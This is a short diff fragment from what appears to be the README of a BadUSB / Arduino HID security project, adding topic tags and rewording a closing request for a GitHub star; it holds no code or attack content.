+arduino  embedded-systems  device-scripting  cybersecurity  security-research
+windows  badusb  red-team  arduino-hid
+```
 
 ---
 
@@ -405,6 +586,6 @@ See [LICENSE](LICENSE) for the full text.
 
 <div align="center">
 
-If this helped you understand how BadUSB attacks work, drop a ⭐
+If this helped you understand USB HID attacks and cybersecurity fundamentals, drop a ⭐
 
 </div>
